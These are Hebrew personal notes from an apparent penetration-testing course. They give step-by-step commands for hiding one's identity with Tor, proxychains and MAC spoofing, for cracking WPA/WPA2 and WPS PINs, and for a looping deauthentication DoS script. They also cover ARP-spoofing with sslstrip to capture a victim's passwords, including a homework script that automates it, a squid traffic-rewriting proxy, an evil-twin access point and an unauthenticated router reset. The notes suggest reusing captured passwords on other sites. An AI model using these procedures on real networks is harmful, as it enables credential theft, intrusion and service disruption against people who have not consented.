עבודה עם TOR
------------------
-הרשת האפלה מוסתרת וניתן להגיע אליה רק עם TOR בגלל שהאתרים בנויים עם סיומת onion 
האתר המרכזי שאליו גולשים הוא the hidden wiki והכתובת שלו כל הזמן משתנה
באתה הזה יש מלא קישורים לכל מיני אתרים מוסתרים שעולים ויורדים כל הזמן ומכילים מידע שלא תמיד חוקי אבל זה הרשת של הקהילה שמתעסקת בזה... לא ניתן להגיע לדפי רשת אלו מדפדפן רגיל, אם אנו רוצים לגלוש לאתרים אלו עדייף שזה יהיה ממחשב וירטואלי בלבד וגם דרך TOR כי אחרת לא ניתן לגלוש דרך זה... לפי הקורס יש שם כלים שיכולים לעזור בעולם הPT.



עבודה עם PROXY
-------------------
-לפעמים נעשה שימוש בפרוקסי אבל אלו הקיימים באינטרנט הם לא תמיד אמינים כי הם נופלים ועולים כל הזמן, עקרונית נשתמש בmetasploit כדי לבצע פריצות של דברים או למצא חולשות והוא לא יכול לעבוד עם פרוקסי והוא עובד אוטומטי (קוד אוטומטי לשבור את המערכת) אנחנו יכולים באופן אנונימי לבצע תעבורה כמו NMAP באופן כללי. יש לנו פרוקסי בקאלי לינוקס אפשר להשתמש בתור כי הוא עובד עם פרוקסים ברשת. הפעם נגדיר פרוקסי ולא נתקין פרוקסי (תור). proxychains.conf זה נמצא בetc ונותן יכולת לנתב תעבורה דרך שרתים רציניים ברשת, אם אנו תוקפים יעד ספציפי זה יכול לשמש ככלי אבל לא אם עושים bootfurcing שזה מצריך שימוש בכלים חזקים יותר, לדוגמא תקיפה על יעד שאנו כבר מחוברים אליו זה יכול לעבוד טוב, אבל סריקת פורטים לא תעבוד כמו שצריך דרך הפרוקסיים הללו, יש לנו מספר פרוקטוקולים לשימוש http or sock4 or sock5 אנו נשתמש תמיד בsock5 שהוא תומך ipv6 וגם udp כי sock4 לא תומך, יש לנו בקובץ הזה רשמות של פקודות מוכנות ואפשר לאפשר או לבטל אותם עם # כידוע בלינוקס, 
	-יש לנו שני אופציות strict_chain מאפשר שימוש במספר פרוקסיים באופן חוזר כלומר אם יש לנו A B C פרוקסיים אזי תמיד זה יהיה הסדר הזה שנבצע התחברות A B C והם חייבים להיות תמיד חיים וזה לפי הרשימה של הפרוקסיים בהמשך הקוסץ
	- האופציה השניה dynamic_chain אם אחד הפרוקסיים לא פעיל אנו למעשה נדלג עליו ונמשיך ברשימת הפרוקסיים לכוון ההתחברות ליעד שלנו
	-אם נרצה לעבור על תור ולנתב הכל כל התעבורה דרך פרוקסיים אנו נשתמש בdynamic_chain 
	-אופציה נוספת random_chain החיבור יעשה באופן רנדומאלי לשרתי הפרוקסי שנמצאים ברשימה
	-יש את היכולת להשתמש בDNS שלא שייך לנו כלומר proxy_dns כדי לא לחסוף את המיקום שלנו על ידי הDNS ההוא
	-עקרונית הרשימה של הפרוקסים מכילה את סוג הפרוקסי את הIP שלו את הPORT איתו אנו נעבוד את השם משתמש וסיסמא הסיסמא היא בטקסט נקי לרוע המזל אבל לא אמור להיות לאיש גישה לזה גם ככה

נשתמש בקומבינציה בין תור לבין הפרוקסי כדי לוודא שאנו באמת אנומימיים וזה מאוד חשוב לוודא את זה
פקודות:
service tor status -check the status of tor on PC
service tor start - in case the tor is down
proxychains firefox www.duckduckgo.com - serchin engin that doesnt recored our IP address this command open the brouser via the proxies
ניכנס לדפדפן ונבצע חיפוש dns leak כדי לראות מאיפה הוא מזהה אותנו ולהיות בטוחים שאנו אנונימיים והוא יגיד לנו מה הכתובת שלנו שהוא מזהה וניתן אפשרות לראות גם מה הכתובת של שרת הDNS איתו אנחנו עובדים, זה טוב לעבוד עם הטרמינל ולעבור על הלוגים כדי לראות דרך איזה פרוקסי אנחנו עובדים ואילו שרתים לא עבדו לנו אם בכלל

כל אפליקציה שעובדת עם הרשת ניתן לתת לה את הפקודה proxychains לפני כדי להסתיר את הכתובת שאיתה אנו גולשים

נבדוק באינטרנט לחיפוש של free sock5 proxies ונוכל למצא רשימות כאלו שנוכל להשתמש בהם ברשימה המקומית שלנו לגלישה ברשת



עבודה עם VPN
----------------
 - בבדיקה ראשונה אנו נראה כי אין לנו VPN פעיל הקאלי ולכן אנו צריכים להתקין אותו על המכונה עם הפקודות הבאות:
apt-get install network-manager-openvpn-gnome -y
apt-get install	network-manager-pptp -y
apt-get install	network-manager-pptp-gnome -y
apt-get install	network-manager-strongswan
apt-get install	network-manager-vpnc -y
apt-get install network-manager-vpnc-gnome -y
נשתמש בVPN אם נרצה כתובת סטאטית, כמו כן גם הכתובת שלנו תיהיה שונה לאחר הקמת הVPN
מומלץ להגדיר VPN דרך הטרמינל (אפשר לעשות זאת דרך networkmanager אך מומלץ שלא)

ניכנס לאתר שיש לו openVPN לדוגמא bookvpn ונוריד את הקבצים cert שמאפשרים לנו להתחבר לאותו VPN  חינמי,
לאחר מכן נלך לטרמינל ניכנס לאותו מיקום של הקבצים שהורדנו לאחר שחילצנו אותם ואז נבחר את הVPN המתאים לנו כדי להתחבר אליו ונקליד את הפקודה
openvpn --config vpnbook-ero2-tcp443.ovpn
 החלק האחרון של הפקודה זה הקובץ שהורדנו וזה הVPN אליו נתחבר
לאחר ניסיון התחברות מוצלח יהיה לנו גישה לרשת דרך אותו VPN ואם נעשה בדיקה what is my ip אמור להיות לנו כתובת שונה 
חשוב בנוסף להגדיר את הDNS מחדש כדי שלא נשתמש בDNS של הISP שלנו כי אם לא נשנה את הDNS יככולים לעלות על המיקום שלנו ולכן חשוב לשנות את שרת הDNS אליו אנו נפנה את הבקשות שלנו
נלך למיקום הבא  
/etc/resolv.conf
ושם נוסיף שרת FreeDNS שנמצא מהרשת 
nameserver 4.4.4.2
ההגדרה הזאת תבטיח שבDNSLeak יראות DNS אחר ולא את הDNS שלנו
שינוי בקובץ הזה ישנה מיידית את הDNS אבל לא תמידית  כלומר בהפעלה הבאה יחזור הDNS הישן להיות מוגדר

לאחר שסיימנו להגדיר הכל אנחנו צריכם לודא שזה באמת עובדד כמו שאנו רוצים נלך לDNSLEAK כדי  לבדקו שאנחנו בסדר ונעשהבדיקהDNS leak ולאחר שראינו שאנו מוסתרים נלך ונמשיך במבדק חדירה







עבודה עם macchanger
---------------------------
אם לא מותקן אצלנו נוכל לחפש אותו עם הפקודה
apt-cache search macchanger

ולהתקין את מה שרלוונלתי
נוכל לראות את רשימת היצרים
macchanger -l
נוכל להשתמש בחלק הראשון של המאק כדי לדמות את עצמנו כאילו אנו חלק מהארגון לדוגמא להשתמש ב
00:09:e8 
חלק זה של המאק שייך ליצרן CISCO ומנהל הרשת לא יבין ויחשוב שזה אחד הציודים שלו במקרה ונשתמש בMAC זה
כדי לשנות את המאק נשתמש ב
macchanger -r eth0
שזה משמש להביא מאק רנדומאלי לכרטיס שלנו
זה ישנה את הcurrent אבל לא את הpermanent אבל התוצאה תיהיה טובה כי זה המאק שאיתו נגלוש ברשת וזה יהיה המזהה שלנו ברשת

בכל עליה של המחשב נרצה לא להשתמש בMAC אמיתי שלנו ולכן כדאי להגדיר סקריפט שיעשה את העבודה הזאת בכל פעם שאנו נדליק את המחשב שלנו ולצורך זה נשתמש ב CRONJUB 

crontab -e 
נוסיף שם את הפקודה שנרצה שהוא יריץ כל reboot
@reboot macchanger -r eth0
 זה יבטיח שכל אתחול זה ישנה לנו את הMAC באופן רנדומאלי


שימוש ב Footprinting with network mapper (nmap) and external resources
-----------------------------------------
היום שימוש בסריקת פורטים היא לא כל כך עוזרת אבל זה יכול לתת שמץ של איזה שירותים רצים באותו target אותו אנו תוקפים על ידי הפורטים הפתוחים והסגורים שלו

לסרוק פורטים אנו נשתמש בNMAP 
לפני סריקת פורטים חשוב להסתיר את הכתובת שלנו כפי שכבר צויין בפרקים הראשונים

יש אתרים שיכולים להציג לנו את הרשימה של הכתובות שיש ברשת למי זה שייך ומתי הוקצע לו לדוגמא major IP blocks 
נוכל לדוגמא לחפש את הבלוקים של ישראל ואם לא יהיה רשום למי הוקצע הIP נוכל לעשות חיפוש לדוגמא
how is 93.175.32.0/19
וזה ימצא לנו למי זה שייך במנוע חיפשו כמו duckduckfo.com

פקודות לדוגמא
 nmap -v -A scanme.nmap.com

נניח ואנו עושים סריקה מקומית
nmap -oG - 10.0.2.1-255 -p 22 --vv > /home/SCAN
סורק פורט 22 על המכונות בrange שציינו ויציג לנו את הפלט וישמור את הפלט בקובץ שציינו 

ניתן לחתוך מהקובץ את הנתונים שנרצה עם הפקודה
cat /home/scan | grep Up | awk -F " " '{print $2}'
הפקודה הראשונה מדפיסה את הקובץ על  המסך, הפקודה השניה תציג רק את Up המצויינים - כלומר את השורות עם המלל Up, החלק האחרון  חותך את הרווחים -F " "  ואת מדפיס את החלק השני בין הרווחים מה שיציג לנו רק את כתובות הIP שנמצאות במצב UP 

F - fild delimited
יפריד את כל השדות לפי הערך שניתן לנו, במקרה שלנו יפריד את הרווחים זה כאילו יש לנו עכשיו את הרכים הבאים מהקובץ:
"host:","10.0.2.2","()","status:","Up"
במקום
host: 10.0.2.2 ()	status: Up
וזה יכול לעזור מאוד כדי להכין קובץ רק עם כתובות IP שיצאו לנו מהפלט הראשון

עכשיו נוכל לבצע סריקה על אותן כתובות שנמצאות בתוך הקובך SCAN2 
scan -iL /home/SCAN2 -vv

נוכל להשתמש בפקודה הבאה כדי להשיג נתונים על כתובת ספציפית
curl ipinfo.io/109.67.170.222

באתר של NMAP נוכל למצא עוד כל מיני סקריפטים לביצוע PT כמו vuln
https://nmap.org/nsedoc/categories/vuln.html

לדוגמא firewall bypass 
יופיע שם הסקריפט לביצוע הסריקה רק צריך לשנות יעד

nmap --script firewall-bypass <target>

אתר נוסף בעל משמעות רבה 
exploitDB
מסד נתונים של חולשות בפרוטוקולים ברשת
שיעורי בית:
להיכנס לאתר הזה למצא חולשה של הנתב הביתי 
במקרה שלי מצאתי חולשה לנתב NETGEAR WNDR3400 N600 wireless dual band
אפשר לגשת לקישור הבא:
http://server/genie_pppoe.htm
במקום השם של השרת יש להכניס את הכתובת
נגיע לדף בו הוא יבקש להעלות קובץ גיבוי של ההגדרות של הנתב
הקובץ אמור להיות cfg. ניתן ליצוק קובץ דיפולטי כזה לפני ואז להעלות את הקובץ לנתב והוא יאפס את ההגדרות למה שיש לו בקובץ



איך לבצע Attacking wireless networks cracking WPA/WPA2
------------------------------------------------------
אנו צריכים שני רכיבים
aircreck-ng
reaver

אם אתם מורידים את שני אלו מהאינטרנט עדיף ומומלץ להוריד מcode.google.com ולאחר ההורדה תקראו את README הקיים בכל אחד מהם

נצטרך מחולל סיסמאות, נוכל להשתמש בcrunch כדי לבצע זאת,
crunch 3 5 abcd
יכולל מ3 ספרות עד 5 ספרות סיסמאות המכילות קומבינציה של abcd

אפשר לחולל סיסמאות עם הaircreck
crunch 3 5 abcd | aircreck-ng .....

עקרונית אנו נשתמש ברשימת סיסמאות על aircreck לדוגמא
aircreck-ng -w passwordlist.txt
וזה עדיין לא מבטיח שנצליח לפרוץ את הסיסמא של הWIFI
נכול לעשות משהו אחר להשתמש בקראנץ עם איירקרק כי אם הקומבינציה בקראנץ ארוכה מידי לא נוכל לשמור את זה לקובץ כי זה יהיה כמה טרות או כמה פיטות שזה המון ולכן שימוש בקראנץ עם איירקרק יעזור להעביר סיסמא סיסמא לאיירקרק למרות זאת זה ייקח המון זמן פעולה

פעולה:
1. ifconfig wlan0 down
2. iwconfig wlan0 mode monitor - מאפשר עבודה כמוניטור לרשת
3. ifconfig wlan0 up

4. airmon-ng check wlan0
אם נראה תהליכים שעובדים עליו אז יש להרוג אותם כדי שזה לא יפריע לנו לעבודה על הוויפי
5. kill <PID> or sudo kill -9 <PID>
6. airmon-ng check wlan0 
בדיקה נוספת שאין תהליכים רצים
7. airodump-ng wlan0
יציג את כל נקודות הגישה הקרובות אלינו (זה למעשה סריקה פשוטה של APs)

8. airodump-ng -c 6 wlan0 --bssid 90:43:23:00:20:81 -w SCAN_test 

אנחנו סורקים את channel6 עם ממשק wlan0 כאשר הMAC שאנו מנסים לקלוט הוא 90:43:23:00:20:81 ומה שמתקבל נשמור לתוך קובץ SCAN_test

9. aireplay-ng -0 0 -a 90:43:23:00:20:81 wlan0
זה גורם למכונה שלנו ליצור בקשה להתחברות מחדש כאשר כתובת המקור ממנו משדרת היא 90:43:23:00:20:81 שזה למעשה הAP שאנו רוצים אליו גישה, זה יגרום למשתמשים לעוף החוצה ולהתחבר מחדש ה-0 אומר שזה ישלח בלופ, אם היה שם מספר זה היה שולח מספר הפעמים שרשמנו, עכשיו עלינו להמתין עד שבמסך של הפקודה ב-(8) תתבצע התחברות מחדש של מכונה, ברגע שתיהיה התחברות כזאת זה אומר שהצלחנו ללכוד את החבילות עם הסיסמא, עכשיו עלינו לפרוץ את הסיסמא בקובץ שנוצר (זה יותר מורכב מזה אופן הפעולה אבל בכל זאת, תחפרו באינטרנט איך זה באמת עובד זה חשוב מאוד)

10. aircrack -w <word-list> <capture.cap>
שימוש ברשימת סיסמאות כנגד הקובץ שנוצר לנו 

10. crunch 11 11 -t %%%%Thunder 1234567890 | aircrack-ng -w - SCAN_test-01.cap -e <ssid name>
בדוגמא זאת אנו משתמשים בקראנץ לחולל סיסמאות ולזרוק את זה לaircreck יש לכם (-) שאומר שהוא יקבל נתונים מפקודה אחרת (זה לא רק לווירלס, זה מאפשר לעשות brutattack לכל דבר) מומלץ לדעת לפחות חלק מהסיסמא/
החלק הבא אומר
11 11 -t %%%%Thunder 1234567890 |

הגודל של הסיסמא באורך היא 11 והסיסמא אמורה להיות מספרים בהתחלה (4 מספרים) ולאחר מכן המילה Thunder שידוע לנו ואז כל רשימת המספרים שיש לנחש מ1 עד 9
נקליד אנטר וזהוא יחפש את הסיסמא (נוכל לראות כמה הגודל של כל העסק של החיפוש הפעם

נניח ויש לנו נתב עם סיסמת PIN והיא כוללת רק מספרים.. במקרה זה נוכל להשתמש בreaver

נשיג את הכתובת של הנתב על ידי route או על ידי ifconfig

נבצע פעולות דומות למה שעשינו קודם
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
ieconfig wlan0 | grep Mode
נוכל להכין מזה סקריפט monitor.sh

לאחר מכן נצב שוב דברים דומים למה שעשינו קודם
airmon-ng check wlan0
כדי לראות אם יש תהליכים שרצים על הרשת ולמחוק אותם
kill <PID>

לאחר מכן נעשה שוב את הבדיקה שאין שום תהליך שרץ על הממשק רשת או משתמש בו
service NetworkManager restart 
נעשה זאת כדי להחזיר את הדברים לעבוד כרגיל

נשתמש בפקודה חדשה להיום
wash -i wlan0
בדרך כלל זה יוצר שגיאות וכדי לתקן את זה נעשה
mkdir /etc/reaver 
לאחר שיצרנו את התיקייה הזאת זה צריך לעבוד 

נוכל לראות את הBSSID את הCHANNEL והכי חשוב  WPS locked צריך להיות NO אם כתוב YES זה אומר שהWPS חסום על הציוד הזה והתקיפה שלנו לא תיהיה רלוונתית לגבי הPIN הזה של הנתב 

נבצע שוב את הפקודה
airodump-ng wlan0
שוב זה יראה לנו את כל הAP הנמצאים בסביבה

ואז ננסה לפרוץ
reaver -b <BSSID> -i <interface> -c <channel>
reacver -b 23:a7:bc:26:85:01 -i wlan0 -c 6 -vv

זה ירוץ וינסה למצא את הסיסמא מול הנתביש להשאיר את זה ככה יום או יומיים עד שימצא את הסיסמא והוא כל הזמן יתריע על קצב התקדמות
עוד פקודה שיכולה לעזור לראות מה המוד שאיתו אנחנו עובדים
iwconfig wlan0 | grep Mode

ניתן להגדיר לו כמה נסיונות לבצע פר דקה
reacver -b 23:a7:bc:26:85:01 -i wlan0 -r 2:60
 זה אומר 2 נסיונות ב60 שניות

יש עוד כלי שיכול לעזור לפחות כדוגמא
ישנם נתביים בייתים שעובדים עם אלגוריתם שיותר להם את הPIN, ישנם אנשים שעשו revers enganire ומצאו לדוגמא שבנתב מסוג DLINK הPIN נותר על ידי האלגוריתם בהתבסס על החלק הראשון של הMAC של הנתב שזה ממש חסר אבטחת מידע

במקרה זה יש סקריפט בפייתון בשם pingen.py אם ננסה להריץ אותו ולהכניס לו את הכתובת MAC של הנתב של DLINK אותו ננסה לפרוץ אזי הוא יוציא לנו את הPIN ברירת המחדל של הנתב 
אפשר לחפש באינטרנט אם יש עוד דברים בסגנון 

יש מקרים בהם נרצה שהנתב שאנו תוקפים יעבור אתחול כיוון שאם אנו לא מצליחים להתחבר לwifi מה הדבר הראשון שנעשה... נאתחל את הנתב... לכן ננסה לגרום לנתב לעבור אתחול 

נבצע את הסקריפט שרשמנו monitor.sh
airmon-ng check wlan0
שוב לבדוק אם יש תהליכים שרצים על כרטיס הרשת

airodump-ng wlan0
לסרוק את הרשת מחדש את הרשת

ולאחר מכן ננסה שוב להפיץ BC עם הכתובת של AP
aireplay-ng -0 0 -a 34:76:23:62:25:65 wlan0

להגדיר את הממשק בchannel אחר
iwconfig wlan0 channel 6
נעשה זאת למקרה שנראה שיש לנו שגיאה על הC שאנו מנסים לסרוק
נבצע שוב BC על הרשת


שוב סריקה על הרשת
airodump-ng wlan0
ונעשה סריקה ספציפית 
airodump-ng wlan0 --bssid 34:76:23:62:25:65 
סריקה על הMAC הזה כדי לראות אם הChannel משתנה


ראינו בעבר שהAP משנה channel או משנה מטודה של הצפנה אז נשאלת השאלה איך נדע אם משהו משתנה וננסה להחבר אליו? התשובה היא שיש משתמשים מחוברים וגם אם הAP משנה ערכים המשתמשים המחוברים עדיין מחוברים עם הערכים הישנים ולכן זה לא מהווה בעייה

ההפצה של הBC היא למעשה הDOS שאנו מבצעים.. אבל אנו לא רוצים שיגלו ויזהו את הMAC שלנו לדוגמא.. נניח והAP יודע לחסום או להתעלם מבקשות BC חוזרות, ולכן נעשה שינוי MAC על הזמן

הדרך החכמה לפעול פה היא לעשות סקריפט שיעשה את הפעולות הללו אוטומטית ויבצע התקפת DOS על הAP

#!/bin/bash
while true
do 
	aireplay -0 5 -a 34:76:23:62:25:65 wlan0
	
	ifconfig wlan0 down
	macchanger -r wlan0 | grep "New MAC"

	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
	iwconfig wlan | grep Mode

	sleep 3
	echo Waiting!

done


נהפוך את הסקריפט לאפשרות הרצה על ידי chmon +x



תקיפה על SSL SSL strip 
-----------------------------

כאשר אנו מחוברים לwifi אנו נוכל לראות שיחות ממשתמשים לכוון אתרים, הקטע הוא שהכל יהיה מוצפן בSSL ולא נוכל לראות cred של משתמש מסויים שמנסה לגשת לרשת 

יש תוכנית בשם SSL SCRIPT שממירה HTTPS ל HTTP  וברגע שמידע לא מוצפן אנו נוכל לראות שם משתמש וסיסמא על הרשת בה אנו נמצאים, התוכנה נקראת sslstrip וזה סוג של man in the middle

בנוסף אנו צריכים לבצע dns spofing כדי  לגרום לנתב להעביר לנו את חבילות המידע שהעמדה שולחת לו (כאילו אנחנו הDG של העמדה)  נשתלמש בdsniff וזה יגרום לנתב להעביר חבילות מידע אלינו ואנחנו נסיר את ההצפנה ושלח לנתב שיעביר את זה לאינטרנט

לא על כול האתרים התכניקה הזאת תעבוד.. אבל בגלל שאנשים נוטים להכניס את אותה סיסמא במספר אתרים שונים.. נוכל ללכוד סיסמא שיש להם באתר אחד ולנסות להשתמש בסיסמא הזאת באתר אחר ואולי יש סיכוי שזה יעבוד

אנחנו שוב נעבוד על פי הסדר הבא:
1. echo 1 > /proc/sys/net/ipv4/ip_forword 
מאפשר להעביר חבילות הלאה כאילו המחשב שלנו הוא נתב, ברירת מחדש זה 0 בקובץ הזה שלא יכול להעביר נתונים הלאה

2. iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
זה למעשה הFW שיש לנו בלינוקס והוא ימיר את התעבורה בNAT, הפקודה אומרת לקחת את התעבורה ולעשות לה הפנייה מחדש לפורט 8080 במקום פורט 80

3. iptables -t nat -L PREROUTING
הפקודה הזאת תציג לנו את הטבלה של מה שהגדרנו, כך נוכל לבדוק מה שהגדרנו, נוכל לראות שיש הגדרה של הפנה מחדש בTCP מפורט 80 (HTTP) לפורט 8080

4. ifconfig eth0
נוכל לראות את הממשק באיזה רשת הכתובת שלו נמצאת זה הממשק שמחבר את המחשב שלנו לרשת

5. nmap 192.168.1.2-254 -vv
סריקה מלאה על הרשת כדי לראות איזה מכונות יש לנו בסגמנט שלנו
במקרה שלי יש רק עוד עמדה אחרת מלבד העמדה שלי

6. arpspoof -i wlan0 -t 10.0.0.138 -r 10.0.0.6
חשוב להבין
הDG האמיתי הוא 10.0.0.138 עם כתובת MAC לדוגמא X
הקורבן הוא 10.0.0.6 עם כתובת MAC לדוגמא Y
התוקף הוא עם הכתובת MAC לדוגמא o

הפרודה הזאת תפיץ את החבילות הבאות:
10.0.0.6  הכתובת MAC שלו היא o
10.0.0.138 הכתובת MAC שלו היא o

זה למעשה מפנה את הDG לo כדי להגיע ל0.6 ואותו דבר הפוך, 0.6 עובר דרך o כדי להגיע ל138


7. arpspoof -i wlan0 -t 10.0.0.6 -r 10.0.0.138
אותה פקודה רק הפוך

צריך לאפשר על המכונה של התוקף את פורט 8080 
8. iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
הפקודה הזאת מאפשרת את פורט 8080 להאזנה
9. iptables -L INPUT 
בדיקה שהכל רשום כשורה

10. sslstrip -l 8080
הפעלת הסטריפ, עכשיו הוא מאזין לפורט 8080 (להפעיל בטרמינל נפרד)

11. tail -f sslstrip.log
נותן לראות את הלוג בזמן אמת שהוא מתמלא (להפעיל בטרמינל נפרד)

לאחר מכן ננסה להיכנס דרך הדפדפן של הקורבן לאתרי אינטרנט, ואם זה יעבוד כמו שצריך אזי בדפדפן במקום https יהיה כתוב http, אם זה לא יעבוד אז יהיה כתוב https והקטע המגניב שאם זה עובד ניתן לראות את כל הסיסמאות שעוברות ברקע

בIE זה יעבוד כפי שציינו ויהיה ניתן לראות סיסמאות והכל
אבל בchrome או firefox זה לא יעבוד מכיוון שהם כבר מיישמים את hsts ומומלץ לקרא על זה!

שיעורי בית:
 - לכתוב סקריפט שעושה את כל הפעולות לבד

echo "Welcome to GuyTcontrol - man in the middle script."
echo "Please type the ip of your VICTIM: "
read VICTIM
echo "Please type the ip of your DG: "
read DG
echo "Please type REDIRECT port number: "
read REDIRECT
iptables -I INPUT 1 -p tcp --dport $REDIRECT -j ACCEPT
iptables -t nat -L PREROUTING
echo "Strting arp poisoning on another terminal..."
arpspoof -i wlan0 -t $VICTIM -r $DG > ./arpspoof.log | sslstrip -l $REDIRECT | tail -f sslstrip.log



-------איך לעשות מתיחה של אחד באפריל--------------

עקרונית אנו יכולים לנתר את חבילות המידע ברשת אז זה אומר שאנו יכולים לשנות אותם לפני שליחתם לאינטרנט, מה שנעשה עכשיו אנו נגדיר סקריפט בעמדת התקיפה שלנו וכל בקשה שהמשתמש עושה לכוון גוגל אנו נשנה אותה, כלומר, אם נניח הוא כותב בגוגל משהו כמו what day אנו יכולים להגדיר מחדש את הבקשה מחדש ויהיה כתוב what day is metalroock , וכמו שיש סקריפט שעושה את השינוי הזה ניתן להביא מהאינטרנט סקריפטים אחרים שמגדירים נניח את הURL או שמשנים תמונות או לכתוב סקריפט בעצמנו שעושה מה שאנחנו רוצים, לפני הכל יש להתקין כמה רכיבים

apt-cache search squid3
apt-get install squid3 -y - מגדיר לנו שרת פרוקסי על העמדה שלנו
apא-get install apache2 -y - מגדיר לנו שרת וואב על העמדה
apt-get install -y install imagemagick ghostscript jp2a -שלושה סקריפטים שנצטרך להשתמש בהם

imagemagick - זאת תוכנה שמאפשרת לעשות שינויים על תמונות באינטרנט
שני האחרים הם סקריפטים

נגדיר הכל לפני שנמשיך הלאה
נוריד עוד סקריפטים נוספים לדוגמא להוסיף מילים לחיפוש בגוגל כמו שציינתי מקודם
googleSearch.pl - זה סקריפט שמשנה את המלל בבקשה של המשתמש לגוגל
fightClub.pl - עוד סקריפט מגניב ששווה להסתכל עליו

נעיף מבט על ההגדרות של squid3 (יתכן שזה יהיה רק squid חשוב לשים לב)
nano /etc/squid3/squid.conf
נחפש את השורה שמתאימה לסגמנט שלנו, במקרה שלי זה
#acl localnet src 10.0.0.0/8
ונוריד את ה# 

החלק הבא הוא לחש את השורה
http_access allow localnet
זה מאפשר גישה לכל המשתתפים ברשת לhttp

http_port 3128 transparent
זה יגרום למשתמשים להשתמש בפרוקסי כברירת מחדש ברגע שנעשה עליהם ספוף


 חשוב לזכור אנו בעצם מגדירים את הפרוקסי עכשיו
עקרונית סיימנו אבל נצטרך להכניס את הסריפט שאנו רוצים שייושם על כל העמדות ברגע שהם מתחברים
נוסיף את השורה הבאה בסוף הקובץ
url_rewrite_program /root/googleSearch.pl
שים לב למיקום של הסקריפט כפי שמופיע אצלך
ניתן להוסיף כל קובץ שאנו רוצים כאן.. זה צריך להיות סקריפט שהשרת משתמש בו בבקשות לאינטרנט

לאחר שמירת הקובץ וכל השינויים נעשה אתחול לsquid3
service squid3 restart
זכרו אולי זה יהיה squid בלבד

הפקודה הבאה להגדיר בFW איפשור לפורט 3128 המשמש את הפרוקסי שלנו

iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128

נבצע בדיקה שזה עובד כמו שצריך
iptables -t nat -L PREROUTING

לא לשכוח להגדיר שיהיה אפשר לבצע העברה של חבילות מידע מהמחשב ש`לנו הלאה (כאילו אנחנו נתב)
echo 1 > /proc/sys/net/ipv4/ip_forward

ניצור תיקייה חדשה
mkdir /var/www/tmp
chmod 777 /var/www/tmp

נאתחל את השרת אפצי
service apache2 restart

לאחר מכן נעשה arpspoof כדי לגרום לכל המשתמשים ברשת לעבור דרכנו

arpspoof -i eth0 -t 10.0.2.15 -r 10.0.2.2
arpspoof -i eth0 -t 10.0.2.2 -r 10.0.2.15
במקרה שלי הקורבן זה 10.0.2.15 
הDG הוא 10.0.2.15

נרעיל את שניהם כדי שיראו את הMAC שלנו 

כל פעם שנעשה שינוי לסקריפט googleSearch צריך לאתחל את squid3

iptables -t nat --line-numbers -L 
iptables -t nat -D PREROUTING <line number>
זה כדי למחוק חוקים מתוך הטבלה של הiptables





ביצוע Evil twin
-------------------------------------

אנחנו נעלה עם wifi שמזייף את הwifi המקורי, אנחנו נציף את הרשת כדי שכולם יעופו החוצה ואז אנחנו בעצם נגרום לכולם להתחבר מחדש והם יעשו התחברות אלינו כיוון שאנו מזייפים את הwifi האמיתי

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig wlan0 | grep Mode
airmon-ng check wlan0
kill <PID>


עעכשיו נעשה סריקה על הרשת
airodump-ng wlan0

נבחר את הbssid שאנו רוצים לזייף ונקליד את הפקודה הבאה
airbase-ng -a 90:42:13:33:42:12 --essid "Home" -c 6  wlan0
ועכשיו הwifi המזוייף ירוץ (זה גם ייצור ממש at0 שנוכל לראות בiwconfig)
עכשיו צריך להעיף את כולם ולגרום להם לבצע התחברות מחדש
aireplay-ng -0 0 -a 90:42:13:33:42:12 wlan0

עכשיו כולם יעופו החוזה מהwifi אליו הם היו מחוברים והתחברו אלינו


מי שיהיה מחובר אלינו לא יהיה לו קישור לאינטרנט כי לא הגדרנו זאת ולכן יש להגדיר את זה
נתקין את bridge-utils

נגדיר קישור לאינטרנט - זה נקרא הגשר שלנו וניתן לו שם במקרה שלנו זה evil
brctl addbr evil

עכשיו נקשר את החיבור evil לקישור שמחבר אותנו לאינטרנט שזה ממש eth0
brctl addif evil eth0
שים לב זה לא עובד על ממש wireless עד כמה שידוע לי

brctl addif evil at0
עכשיו אנחנו משייכים את הevil לat0
עקרונית לאחר מכן צריך להעלות את הממשקים למעלה ולהפעיל DHCP

ifconfig evail up
ifconfig at0 0.0.0.0 up
dhclient evil
ואז אם מישהו מתחבר אלינו אנחנו יכולים לקלוט את התעבורה שלו בwireshark
****אצלי זה לא עבד.. זה נראה כאילו הפלאפון שלי לא מקבל IP מה-EVIL 
--------------------------------------------




שימוש בחולשות Using known vulnerabilities 
------------------------------------------
אנו נחפש חולשות בנתבים ונראה איך לפרוץ נתב בייתי, אנו נשתמש בזה מכיוון שסביר להניח שלפרוץ לארגון גדול זה מורכב אבל יותר פשוט לפרוץ לעובדים של הארגון ולבצע התקפה משם.
ראשית ננסה לדלות נתונים על הנתב של אותו משתמש ונפעיל NMAP במידת הצורך, לאחר שנמצא את הדגם של הנתב נבצע בדיקה פשוטה בexploit-DB מה הן החולשות הידועות של הנתב הזה, במקרה שלי מדובר על N600 של netger ולכן בחיפוש החולשה מצאתי מסמך שמתאר שניתן לאפס את הנתב ללא כל ביצוע הזדהות מול הנתב וזה כשלעצמו מהווה בעייה רצינית



















